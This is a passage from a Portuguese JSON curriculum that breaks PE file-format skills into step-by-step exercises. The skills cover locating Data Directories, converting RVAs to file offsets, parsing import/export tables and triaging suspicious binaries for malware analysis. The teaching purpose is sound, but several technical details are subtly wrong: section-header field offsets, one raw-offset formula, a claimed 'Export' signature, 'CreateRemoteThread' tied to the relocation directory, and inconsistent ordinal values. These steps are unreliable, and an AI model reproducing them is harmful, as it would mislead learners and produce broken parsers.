                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar o Optional Header no arquivo PE",
                                  "subSteps": [
                                    "Abra o arquivo PE em um hex editor ou ferramenta como CFF Explorer.",
                                    "Leia o DOS Header para obter o e_lfanew (offset 0x3C, 4 bytes).",
                                    "Pule para o offset e_lfanew para acessar o NT Headers.",
                                    "No NT Headers, leia a assinatura 'PE\\0\\0' para confirmar.",
                                    "Após a assinatura, leia FileHeader (20 bytes), depois Magic (2 bytes) para confirmar Optional Header."
                                  ],
                                  "verification": "Confirme que o Magic é 0x10B (PE32) ou 0x20B (PE32+).",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Hex editor (HxD), amostra PE válida, documentação PE format (Microsoft docs).",
                                  "tips": "Use busca por 'MZ' e 'PE' para navegação rápida.",
                                  "learningObjective": "Identificar e navegar até o início do Optional Header.",
                                  "commonMistakes": "Confundir DOS stub com NT Headers; ignorar alinhamento de 4 bytes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar o campo NumberOfRvaAndSizes",
                                  "subSteps": [
                                    "No Optional Header, localize o offset padrão: após SizeOfCode (4 bytes do FileHeader) + campos fixos.",
                                    "Leia NumberOfRvaAndSizes (4 bytes, geralmente 16 para PE padrão).",
                                    "Verifique se o valor é 16; valores menores indicam PE não padrão.",
                                    "Calcule o offset do DataDirectory: offset atual + 4 bytes (após NumberOfRvaAndSizes).",
                                    "Anote o offset exato do array DataDirectory."
                                  ],
                                  "verification": "NumberOfRvaAndSizes == 16 e offset calculado está dentro do Optional Header size.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Calculadora hexadecimal, amostra PE, PE specification PDF.",
                                  "tips": "Use estrutura IMAGE_OPTIONAL_HEADER32 para offsets exatos (ex: 0xE0 para PE32).",
                                  "learningObjective": "Compreender o papel de NumberOfRvaAndSizes na delimitação do array.",
                                  "commonMistakes": "Ler campo errado (confundir com SizeOfImage); endianness little-endian ignorado."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Ler o array de Data Directories (16 entradas)",
                                  "subSteps": [
                                    "Do offset calculado, leia 16 estruturas IMAGE_DATA_DIRECTORY (cada 8 bytes: RVA 4 bytes + Size 4 bytes).",
                                    "Para cada entrada i (0-15): extraia RVA[i] e Size[i].",
                                    "Liste índices padronizados: 0=Export, 1=Import, 2=Resource, 5=Base Reloc, etc.",
                                    "Converta RVAs para offsets de arquivo se necessário (usando seções).",
                                    "Salve em tabela ou array para referência."
                                  ],
                                  "verification": "Total lido: 128 bytes (16*8); RVAs não-zero para diretórios principais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Script Python simples ou hex editor com tabela, amostra PE infectada.",
                                  "tips": "Automatize com pefile Python library para validação manual.",
                                  "learningObjective": "Extrair e organizar as 16 entradas IMAGE_DATA_DIRECTORY.",
                                  "commonMistakes": "Ler além do array se NumberOfRvaAndSizes >16; ignorar Size=0 como inválido."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e acessar um Data Directory específico",
                                  "subSteps": [
                                    "Escolha índice (ex: 1 para Import Directory).",
                                    "Use RVA do índice para navegar à seção virtual correspondente.",
                                    "Converta RVA para file offset usando DirectoryOfSections.",
                                    "Leia a estrutura no offset (ex: IMAGE_IMPORT_DESCRIPTOR para Import).",
                                    "Valide: pule entradas até DWORD=0.",
                                    "Extraia dados como nomes de DLLs ou funções."
                                  ],
                                  "verification": "Conteúdo extraído faz sentido (ex: kernel32.dll em Import).",
                                  "estimatedTime": "25 minutos",
                                  "materials": "PE amostra com imports conhecidos, debugger (x64dbg).",
                                  "tips": "Verifique alinhamento de seção; use RVA + ImageBase para VA.",
                                  "learningObjective": "Aplicar RVA para acessar conteúdo real de um diretório.",
                                  "commonMistakes": "RVA inválido (0 ou fora do arquivo); não converter RVA para offset."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e documentar todos os Data Directories",
                                  "subSteps": [
                                    "Para cada um dos 16, verifique RVA !=0 e Size razoável.",
                                    "Compare com ferramenta como PE-bear ou CFF Explorer.",
                                    "Documente anomalias (ex: Reloc ausente em malware).",
                                    "Teste navegação para 2-3 diretórios chave.",
                                    "Crie relatório com tabela: Índice | RVA | Size | Conteúdo resumido."
                                  ],
                                  "verification": "Relatório matches output de ferramenta de referência.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Ferramenta de validação (PE-bear), template de relatório.",
                                  "tips": "Priorize diretórios 0,1,5,14 para análise rápida.",
                                  "learningObjective": "Sintetizar acesso completo e detectar inconsistências.",
                                  "commonMistakes": "Assumir todos 16 presentes; ignorar PE32+ diferenças (8-byte pointers)."
                                }
                              ],
                              "practicalExample": "Em um executável notepad.exe (PE32), no Optional Header offset ~0xF0, NumberOfRvaAndSizes=16. DataDirectory[1] RVA=0x40E0 Size=0xA8C. Navegue a 0x40E0 para ver IMAGE_IMPORT_DESCRIPTOR com kernel32.dll e funções como LoadLibraryA.",
                              "finalVerifications": [
                                "Array de 16 IMAGE_DATA_DIRECTORY lido corretamente (128 bytes).",
                                "RVAs e Sizes extraídos batem com CFF Explorer.",
                                "Acesso bem-sucedido a pelo menos 3 diretórios (Export, Import, Reloc).",
                                "Conversão RVA para file offset funciona para dados válidos.",
                                "Relatório documenta todos índices com valores corretos.",
                                "Nenhuma anomalia não explicada em PE padrão."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização do Optional Header (100% offsets corretos).",
                                "Leitura completa e parsing das 16 entradas sem erros de bytes.",
                                "Interpretação correta de pelo menos 80% dos índices padronizados.",
                                "Navegação RVA bem-sucedida com validação de conteúdo.",
                                "Identificação de erros comuns em PE maliciosos.",
                                "Relatório claro e estruturado."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Manipulação de estruturas packed (__attribute__((packed))).",
                                "Assembly x86: Entender RVAs como endereços virtuais em carregamento.",
                                "Sistemas Operacionais: Mecanismos de carregamento PE pelo Windows loader.",
                                "Criptografia: Análise de diretórios como TLS para callbacks.",
                                "Redes: Correlação com imports de winsock para C2 em malware."
                              ],
                              "realWorldApplication": "Em análise de malware reversa, acessar Data Directories revela APIs importadas para detecção de comportamentos maliciosos (ex: CreateRemoteThread em Reloc para injeção), exports para hooks, ou Resources para payloads embutidos, essencial em ferramentas como IDA Pro ou durante incident response."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.2.2",
                            "name": "Navegar para estruturas via RVA usando Section Table",
                            "description": "Converter RVA de um Data Directory para offset no arquivo: encontrar seção contendo o RVA via VirtualAddress, calcular offset = RVA - VirtualAddress + PointerToRawData, e validar contra Size.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar o RVA alvo em um Data Directory do PE",
                                  "subSteps": [
                                    "Abra o arquivo PE em um hex editor (ex: HxD ou 010 Editor).",
                                    "Navegue para o NT Headers (offset 0x3C + 0xF8 para Optional Header).",
                                    "Localize a Data Directory array no Optional Header (após SizeOfImage).",
                                    "Selecione o Data Directory de interesse (ex: Export Table RVA no índice 0).",
                                    "Anote o RVA (Virtual Address) e o Size do directory."
                                  ],
                                  "verification": "Confirme que o RVA anotado corresponde ao campo RVA na estrutura Data Directory visualizada no hex editor.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Hex editor (HxD, ImHex)",
                                    "Arquivo PE de exemplo (ex: simple.exe)",
                                    "Especificação MS PE/COFF"
                                  ],
                                  "tips": "Use busca por padrões como 'PE\\0\\0' para localizar headers rapidamente.",
                                  "learningObjective": "Compreender a localização e extração de RVAs dos Data Directories no formato PE.",
                                  "commonMistakes": [
                                    "Confundir RVA com VA absoluto",
                                    "Ignorar endianness little-endian",
                                    "Ler offset errado no Optional Header"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar a seção na Section Table que contém o RVA",
                                  "subSteps": [
                                    "Vá para o offset da Section Table (NumberOfSections * 40 bytes após o NT Headers).",
                                    "Itere pelas seções: leia VirtualAddress (offset 12 na IMAGE_SECTION_HEADER).",
                                    "Para cada seção, calcule o range: VirtualAddress até VirtualAddress + VirtualSize (offset 16).",
                                    "Encontre a seção onde VirtualAddress <= RVA < VirtualAddress + VirtualSize.",
                                    "Anote VirtualAddress, PointerToRawData (offset 8) e SizeOfRawData (offset 16)."
                                  ],
                                  "verification": "Verifique se o RVA está dentro do range da seção selecionada (ex: 0x1000 >= 0x1000 e 0x1000 < 0x2000).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Hex editor",
                                    "Arquivo PE de exemplo",
                                    "Template IMAGE_SECTION_HEADER"
                                  ],
                                  "tips": "Seções estão em ordem crescente de VirtualAddress; comece da primeira .text ou .rdata.",
                                  "learningObjective": "Mapear RVAs para seções específicas usando a Section Table.",
                                  "commonMistakes": [
                                    "Usar SizeOfRawData em vez de VirtualSize para range virtual",
                                    "Pular seções não executáveis",
                                    "Confundir PointerToRawData com VirtualAddress"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular o offset raw no arquivo usando a fórmula",
                                  "subSteps": [
                                    "Aplique a fórmula: offset = RVA - VirtualAddress + PointerToRawData.",
                                    "Exemplo: RVA=0x1200, VirtualAddress=0x1000, PointerToRawData=0x400 → offset=0x1200-0x1000+0x400=0x600.",
                                    "Navegue para o offset calculado no hex editor.",
                                    "Confirme visualmente o início da estrutura esperada (ex: signature da Export Directory).",
                                    "Registre todos os valores usados no cálculo."
                                  ],
                                  "verification": "O conteúdo no offset calculado deve corresponder à estrutura do Data Directory (ex: 'Export' magic).",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Hex editor",
                                    "Calculadora hexadecimal (ex: Windows Calc em modo programador)"
                                  ],
                                  "tips": "Sempre converta para hex; evite calculadoras decimais para evitar erros de overflow.",
                                  "learningObjective": "Executar o cálculo preciso de RVA para offset raw.",
                                  "commonMistakes": [
                                    "Erro aritmético em hex (ex: borrow em subtração)",
                                    "Usar Size em vez de VirtualAddress",
                                    "Offset negativo indica RVA inválido"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar o offset contra os limites da seção raw",
                                  "subSteps": [
                                    "Calcule o range raw: PointerToRawData até PointerToRawData + SizeOfRawData.",
                                    "Verifique se PointerToRawData <= offset < PointerToRawData + SizeOfRawData.",
                                    "Se fora dos limites, identifique possível corrupção ou RVA inválido.",
                                    "Teste acessando dados além do Size para confirmar limites.",
                                    "Documente a validação em um log ou screenshot."
                                  ],
                                  "verification": "Offset deve estar dentro do range raw da seção; caso contrário, erro detectado.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Hex editor",
                                    "Notas do cálculo anterior"
                                  ],
                                  "tips": "SizeOfRawData pode ser 0 para seções vazias; valide múltiplos Data Directories.",
                                  "learningObjective": "Garantir integridade e bounds checking no acesso a estruturas PE.",
                                  "commonMistakes": [
                                    "Ignorar validação e acessar offsets inválidos",
                                    "Confundir VirtualSize com SizeOfRawData",
                                    "Não checar seções padding"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um PE simples 'hello.exe', o Data Directory de Import Table tem RVA 0x2000. Section .rdata: VirtualAddress=0x2000, PointerToRawData=0x1400, SizeOfRawData=0x500. Offset = 0x2000 - 0x2000 + 0x1400 = 0x1400. No hex editor, offset 0x1400 mostra a IMAGE_IMPORT_DESCRIPTOR array.",
                              "finalVerifications": [
                                "Calculou corretamente offset para pelo menos 3 Data Directories diferentes.",
                                "Validou ranges raw sem overflows ou underflows.",
                                "Identificou e acessou uma estrutura real (ex: Export Directory).",
                                "Explicou o processo em pseudocódigo ou diagrama.",
                                "Testou com PE corrompido para detectar falhas."
                              ],
                              "assessmentCriteria": [
                                "Precisão 100% nos cálculos de offset para RVAs dados.",
                                "Correta identificação de seções via Section Table.",
                                "Validação completa de bounds com explicação.",
                                "Uso correto de ferramentas e documentação de passos.",
                                "Detecção e explicação de cenários edge-case."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Python: Implementar parser PE automatizado.",
                                "Análise de Malware: Localizar payloads em seções obfuscadas.",
                                "Sistemas Operacionais: Entender virtual-to-physical mapping no Windows loader.",
                                "Criptografia: Validar signatures em Data Directories como Security Directory."
                              ],
                              "realWorldApplication": "Em análise reversa de malware, navegar para Import/Export Tables via RVA permite desofuscar dependências dinâmicas sem carregar o binário, essencial para detecção em sandboxes ou ferramentas como IDA Pro/Pefile."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.2.3",
                            "name": "Analisar diretórios principais como Import e Export",
                            "description": "Parsear IMAGE_IMPORT_DESCRIPTOR para tabelas de importação (listando DLLs e funções) e IMAGE_EXPORT_DIRECTORY para exports, identificando dependências e entry points em binários PE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar os Data Directories de Import e Export no PE Optional Header",
                                  "subSteps": [
                                    "Abra o binário PE em um visualizador de PE ou hex editor e navegue pelo DOS Header para encontrar o campo e_lfanew apontando para os NT Headers.",
                                    "No NT Headers, localize o Optional Header e verifique o Magic number para confirmar PE32 ou PE32+.",
                                    "No array DataDirectory (16 entradas), identifique o índice 1 para Import Directory (IMAGE_DIRECTORY_ENTRY_IMPORT) e índice 0 para Export Directory (IMAGE_DIRECTORY_ENTRY_EXPORT), anotando RVAs e tamanhos.",
                                    "Converta os RVAs para offsets de arquivo usando as informações das seções (.text, .rdata etc.).",
                                    "Valide os diretórios cruzando com ferramentas como CFF Explorer para confirmação visual."
                                  ],
                                  "verification": "Confirme os RVAs e Sizes exatos dos diretórios Import e Export listados no Optional Header.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Hex editor (HxD ou 010 Editor)",
                                    "PE viewer (CFF Explorer ou PE-bear)",
                                    "Biblioteca Python pefile para script de verificação"
                                  ],
                                  "tips": "Use o padrão PE magic 'PE\\0\\0' para validar headers; foque em PE32/PE32+ diferenças no tamanho do Optional Header.",
                                  "learningObjective": "Dominar a navegação e localização precisa dos Data Directories no formato PE.",
                                  "commonMistakes": [
                                    "Confundir Data Directories com Section Headers",
                                    "Ignorar alinhamento de seções ao converter RVA para offset",
                                    "Não verificar Magic para arquiteturas 32/64-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Parsear a Tabela de Importações com IMAGE_IMPORT_DESCRIPTOR",
                                  "subSteps": [
                                    "Navegue para o RVA do Import Directory e leia as estruturas IMAGE_IMPORT_DESCRIPTOR em loop até OriginalFirstThunk ou FirstThunk ser zero.",
                                    "Para cada descritor, extraia o RVA do campo Name, converta para offset e leia a string UTF-8 para o nome da DLL.",
                                    "Acesse a Import Lookup Table (ILT via OriginalFirstThunk) e Import Address Table (IAT via FirstThunk) para ler RVAs de nomes de funções ou ordinals.",
                                    "Para entradas por nome, resolva o Hint/Name RVA para extrair o nome da função; para ordinals, anote o valor.",
                                    "Compile uma lista hierárquica: DLL -> [Funções/Ordinals], salvando em formato legível (JSON ou tabela)."
                                  ],
                                  "verification": "Gere uma lista completa de DLLs importadas e suas funções/ordinals de um binário sample.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Hex editor avançado (010 Editor com template PE)",
                                    "Script Python com pefile: pefile.PE('file.exe').DIRECTORY_ENTRY_IMPORT",
                                    "Dependency Walker para cross-check"
                                  ],
                                  "tips": "Em PE carregado, IAT é resolvida; foque em ILT para nomes estáticos; ordinals começam em 1.",
                                  "learningObjective": "Extrair e interpretar dependências dinâmicas de binários PE via parsing manual.",
                                  "commonMistakes": [
                                    "Parar o loop cedo em descritores com FirstThunk=0 mas OriginalFirstThunk válido",
                                    "Não alinhar ponteiros DWORD/ QWORD em PE32+",
                                    "Confundir ILT com IAT em binários bound"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Parsear a Tabela de Exportações com IMAGE_EXPORT_DIRECTORY",
                                  "subSteps": [
                                    "Localize o RVA do Export Directory e leia a estrutura IMAGE_EXPORT_DIRECTORY: NumberOfNames, NumberOfFunctions, AddressOfNames, etc.",
                                    "Carregue a tabela AddressOfNames (array de RVAs para nomes de exports) e resolva cada para string do nome.",
                                    "Carregue AddressOfNameOrdinals (array de WORDs mapeando nomes para índices de funções).",
                                    "Carregue AddressOfFunctions (array de RVAs para as funções exportadas), indexado pelos ordinals.",
                                    "Monte uma tabela: Nome -> Ordinal -> RVA da Função, identificando exports forwarded se RVA apontar para fora."
                                  ],
                                  "verification": "Liste todos os exports com nomes, ordinals e RVAs corretos de uma DLL sample.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "PE-bear ou CFF Explorer (seção Exports)",
                                    "Python pefile: pefile.PE('dll.dll').DIRECTORY_ENTRY_EXPORT",
                                    "Hex editor para offsets manuais"
                                  ],
                                  "tips": "Exports forwarded têm RVA na faixa de outra seção; ordinals podem ter gaps.",
                                  "learningObjective": "Mapear completamente a interface de exportação de DLLs PE.",
                                  "commonMistakes": [
                                    "Indexar errado AddressOfNameOrdinals (é WORD)",
                                    "Não detectar exports forwarded",
                                    "Ignorar NumberOfFunctions vs NumberOfNames"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Dependências e Entry Points Identificados",
                                  "subSteps": [
                                    "Das imports, categorize dependências: system DLLs (kernel32.dll), user DLLs, suspeitas (malware C2 libs).",
                                    "Identifique entry points críticos nos exports (DllMain, DllEntryPoint) e APIs comuns como CreateFile.",
                                    "Trace dependências recursivas (ex: app importa user.dll que importa kernel32).",
                                    "Avalie implicações de segurança: imports de APIs de rede/crypto indicam comportamento malicioso.",
                                    "Gere relatório resumido com grafo de dependências (usando ferramentas como Graphviz)."
                                  ],
                                  "verification": "Produza um relatório com lista de dependências, entry points e análise de risco.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Dependency Walker ou Process Monitor para runtime",
                                    "Python networkx para grafo",
                                    "Relatório template em Markdown"
                                  ],
                                  "tips": "Priorize imports de wininet.dll para análise de C2; exports sem nomes são ordinals-only.",
                                  "learningObjective": "Interpretar imports/exports para análise de segurança e engenharia reversa.",
                                  "commonMistakes": [
                                    "Sobrestimar dependências recursivas sem tools",
                                    "Ignorar imports delayed (bound imports)",
                                    "Não contextualizar para threats"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando 'calc.exe' (Windows\\System32): Localize Import Directory, liste DLLs como kernel32.dll com funções como CreateFileA; para 'kernel32.dll', liste exports como LoadLibraryA (ordinal 662, RVA 0xABCDE). Gere lista: ['kernel32.dll: [GetProcAddress, LoadLibraryExA]] e exports: ['GetProcAddress -> ordinal 0x29A'].",
                              "finalVerifications": [
                                "Lista completa e precisa de todas DLLs e funções importadas sem omissões.",
                                "Mapeamento correto de nomes, ordinals e RVAs para exports.",
                                "Conversão precisa de todos RVAs para offsets de arquivo.",
                                "Identificação de pelo menos 3 dependências críticas e 2 entry points.",
                                "Relatório gerado sem erros de parsing detectados por tool cross-check.",
                                "Análise de implicações de segurança coerente com imports/exports."
                              ],
                              "assessmentCriteria": [
                                "Precisão 100% na localização e parsing dos diretórios (sem erros de RVA/offset).",
                                "Completude: Todas estruturas IMAGE_* parseadas corretamente (90%+ cobertura).",
                                "Profundidade: Substeps executados com evidências (screenshots/scripts).",
                                "Análise qualitativa: Interpretação correta de dependências/entry points.",
                                "Eficiência: Conclusão dentro de tempo estimado com relatório claro.",
                                "Validação: Match 100% com ferramentas como pefile ou CFF Explorer."
                              ],
                              "crossCurricularConnections": [
                                "Programação C/C++: Entender dynamic linking e __declspec(dllexport/import).",
                                "Sistemas Operacionais: Mecanismos de carregamento/resolução de DLLs no Windows loader.",
                                "Análise de Malware: Detecção de API hooking via IAT patching.",
                                "Redes e Segurança: Identificar imports de winsock para C2 analysis.",
                                "Engenharia de Software: Análise de dependências em builds legados."
                              ],
                              "realWorldApplication": "Em análise de malware reversa, examinar imports para detectar uso de APIs de persistência (ex: Registry APIs) ou exports para identificar DLLs injetadas; em auditoria de software, mapear dependências para vulnerabilidades em chains de DLLs (DLL hell); essencial para desenvolvedores em patching de binários ou criação de stubs."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.5.3",
                        "name": "Aplicação em Engenharia Reversa de Binários PE",
                        "description": "Uso das tabelas de seções e diretórios para dissecar binários, identificar código malicioso, alterar fluxos ou injetar payloads, integrando com ferramentas como IDA Pro ou Ghidra.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.5.3.1",
                            "name": "Mapear seções e diretórios para análise estática",
                            "description": "Em um binário PE suspeito, usar section table para extrair código de .text e data directories para inspecionar imports/exports, detectando APIs suspeitas como CreateProcess ou obfuscadas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Parsear Headers Iniciais do PE",
                                  "subSteps": [
                                    "Carregue o binário PE suspeito em uma ferramenta de análise como CFF Explorer ou biblioteca pefile em Python.",
                                    "Verifique a assinatura DOS ('MZ') no offset 0x00 e localize o ponteiro para o NT Header no e_lfanew (offset 0x3C).",
                                    "Parse o NT Header para confirmar a assinatura PE ('PE\\0\\0') e extraia informações básicas como Machine, NumberOfSections e SizeOfOptionalHeader.",
                                    "Anote os valores de ImageBase, SectionAlignment e FileAlignment para cálculos futuros.",
                                    "Valide a integridade dos headers contra corrupção comum em malwares."
                                  ],
                                  "verification": "Confirme que o NT Header foi parseado corretamente exibindo valores como NumberOfSections > 0 e OptionalHeader.Magic == 0x10B (PE32) ou 0x20B (PE32+).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta CFF Explorer ou PE-bear",
                                    "Biblioteca Python pefile",
                                    "Binário PE de teste (ex: innocent.exe)"
                                  ],
                                  "tips": "Sempre trabalhe com cópias do binário para evitar alterações acidentais; use hex editor para offsets manuais se ferramentas falharem.",
                                  "learningObjective": "Compreender a estrutura inicial de um PE para navegação segura à section table.",
                                  "commonMistakes": [
                                    "Ignorar e_lfanew levando a parses errados",
                                    "Confundir PE32 com PE32+ sem checar Magic",
                                    "Não validar assinatura DOS"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar e Ler a Section Table",
                                  "subSteps": [
                                    "Calcule o offset da section table: NT Header + 4 + SizeOfOptionalHeader.",
                                    "Leia as primeiras 8 bytes de cada entrada de seção (40 bytes por seção no PE32) para Name, VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData.",
                                    "Liste todas as seções com seus nomes (ex: .text, .rdata, .data) e anote RVA (Relative Virtual Address) e offsets no arquivo.",
                                    "Identifique seções executáveis (Characteristics & 0x20000000) e legíveis (0x40000000).",
                                    "Crie um mapa visual ou tabela das seções para referência."
                                  ],
                                  "verification": "Gere uma lista completa de seções com pelo menos 4-6 entradas típicas e confirme PointerToRawData crescente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "CFF Explorer (Section Headers tab)",
                                    "Script Python com pefile: pe.sections",
                                    "Hex editor como HxD"
                                  ],
                                  "tips": "Padronize nomes de seções removendo null terminators; foque em seções com nomes truncados como indício de packing.",
                                  "learningObjective": "Mapear precisamente a section table para acesso a conteúdos específicos.",
                                  "commonMistakes": [
                                    "Erro no cálculo do offset da table",
                                    "Ignorar Characteristics levando a extrações de seções erradas",
                                    "Não converter RVA para raw offset"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Extrair e Mapear Seções Chave (.text e .data)",
                                  "subSteps": [
                                    "Localize .text (código executável): use PointerToRawData + RVA para extrair bytes até SizeOfRawData.",
                                    "Extraire .data ou .rdata para dados estáticos; dump o conteúdo em hex ou desassemble com ferramenta como IDA Free.",
                                    "Calcule raw offset: (RVA / SectionAlignment) * FileAlignment + (RVA % SectionAlignment).",
                                    "Inspecione .text por padrões de código obfuscado (ex: junk bytes, anti-disassembly).",
                                    "Salve dumps separados para análise posterior."
                                  ],
                                  "verification": "Dump de .text com pelo menos 1KB de código desmontado e .data mostrando strings ou constantes.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "PE-bear ou IDA Pro Free",
                                    "Python pefile: pe.sections[0].get_data()",
                                    "HxD para dumps manuais"
                                  ],
                                  "tips": "Use scripts para automação: for section in pe.sections: if '.text' in section.Name: print(section.get_data())",
                                  "learningObjective": "Extrair conteúdos de seções críticas para inspeção estática inicial.",
                                  "commonMistakes": [
                                    "Cálculo errado de raw offset causando dumps corrompidos",
                                    "Dump completo do arquivo em vez de seção limitada",
                                    "Não checar overlaps de seções"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Inspecionar Data Directories (Imports/Exports)",
                                  "subSteps": [
                                    "No Optional Header, leia DataDirectory[1] para Import Table (RVA e Size) e DataDirectory[0] para Export Table.",
                                    "Navegue RVA da Import Directory para ler estruturas Import Descriptor e extrair nomes de DLLs e funções (ex: kernel32.dll!CreateProcessA).",
                                    "Para exports, parse Export Directory para nomes de funções exportadas.",
                                    "Busque APIs suspeitas: CreateProcess, WriteProcessMemory, VirtualAlloc com flags de execução.",
                                    "Note imports obfuscados (ex: hashes em vez de nomes) e liste top 10 suspeitos."
                                  ],
                                  "verification": "Lista de pelo menos 5 imports/exports com APIs flagged como suspeitas (ex: CreateProcess detectado).",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "CFF Explorer (Import/Export tabs)",
                                    "pefile: pe.DIRECTORY_ENTRY_IMPORT",
                                    "Dependency Walker"
                                  ],
                                  "tips": "Filtre por 'Exec' ou 'Suspicious' em ferramentas; cross-reference com MITRE ATT&CK para APIs maliciosas.",
                                  "learningObjective": "Detectar comportamentos suspeitos via directories de import/export.",
                                  "commonMistakes": [
                                    "Não resolver forwarders em imports",
                                    "Ignorar DataDirectory Size=0 como hiding",
                                    "Confundir IAT com Import Table"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar Mapeamento e Detectar Anomalias",
                                  "subSteps": [
                                    "Compile um relatório: seções mapeadas, dumps chave, lista de APIs suspeitas.",
                                    "Cheque anomalias: seções com VirtualSize=0 mas RawSize>0, imports não resolvidos, .text com entropia alta (>7.5).",
                                    "Correlacione: .text chamando CreateProcess de .data strings obfuscadas.",
                                    "Gere um diagrama de seções/direcórios usando draw.io ou similar.",
                                    "Documente achados para análise dinâmica futura."
                                  ],
                                  "verification": "Relatório com mapa de seções, 3+ anomalias flagged e APIs suspeitas listadas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "draw.io ou notepad++ para relatório",
                                    "Calculadora de entropia (script Python)"
                                  ],
                                  "tips": "Entropia alta indica packing; priorize seções com 'UPX' ou '?' em nomes.",
                                  "learningObjective": "Integrar mapeamento para detecção holística de ameaças estáticas.",
                                  "commonMistakes": [
                                    "Sobrecarga de dados sem priorização",
                                    "Não calcular entropia para obfuscation",
                                    "Relatório sem correlações"
                                  ]
                                }
                              ],
                              "practicalExample": "Ao analisar 'malware.exe' (um trojan bancário), mapeie .text (RVA 0x1000, raw 0x400) para código injetando CreateProcessA de kernel32.dll (detectado em Import Table RVA 0x5000), e .rdata com strings obfuscadas como 'b%a%n%k', confirmando C2 communication setup.",
                              "finalVerifications": [
                                "Lista completa de seções com RVA/raw offsets corretos.",
                                "Dumps válidos de .text e .data sem corrupção.",
                                "Identificação precisa de pelo menos 3 APIs suspeitas nos imports.",
                                "Cálculo correto de entropia em seções chave.",
                                "Relatório com correlações entre seções e directories.",
                                "Diagrama visual do layout PE."
                              ],
                              "assessmentCriteria": [
                                "Precisão no parsing de headers e section table (100% match com ferramenta referência).",
                                "Qualidade dos dumps e extrações (sem overflows ou truncagens).",
                                "Detecção de anomalias e APIs suspeitas com justificativa técnica.",
                                "Eficiência temporal (dentro de 2h totais).",
                                "Relatório claro, estruturado e acionável.",
                                "Uso correto de ferramentas e scripts."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Python (pefile para automação).",
                                "Análise de Malware (MITRE ATT&CK mapping).",
                                "Estruturas de Dados (arrays e pointers em C/assembly).",
                                "Criptografia (entropia e obfuscation detection).",
                                "Redes (C2 via APIs como WinHttpOpen)."
                              ],
                              "realWorldApplication": "Em equipes de Threat Hunting/SOC, mapeamento de PE seções permite triagem rápida de malwares em incident response, identificando loaders ou droppers via imports suspeitos antes de execução sandbox, acelerando mitigação em breaches corporativos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.3.2",
                            "name": "Detectar packing ou ofuscação via análise de tabelas",
                            "description": "Verificar discrepâncias entre VirtualSize/RawSize, seções com Characteristics anormais ou Data Directories zerados/nulos para identificar packers como UPX ou malware ofuscado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Carregar e Parsear o Cabeçalho PE e Tabela de Seções",
                                  "subSteps": [
                                    "Abra o binário PE em uma ferramenta de análise como CFF Explorer ou PE-Bear.",
                                    "Localize o DOS Header, NT Headers e Optional Header para validar a estrutura PE.",
                                    "Navegue até a Section Table e liste todas as seções com seus offsets, VirtualSize e RawSize.",
                                    "Anote o número de seções e seus nomes (.text, .data, .rdata, etc.).",
                                    "Exporte ou visualize os dados em formato tabular para análise inicial."
                                  ],
                                  "verification": "Confirme que a Section Table foi carregada corretamente sem erros de parsing e todos os campos (Name, VirtualSize, RawSize) são visíveis.",
                                  "estimatedTime": "10-15 minutos",
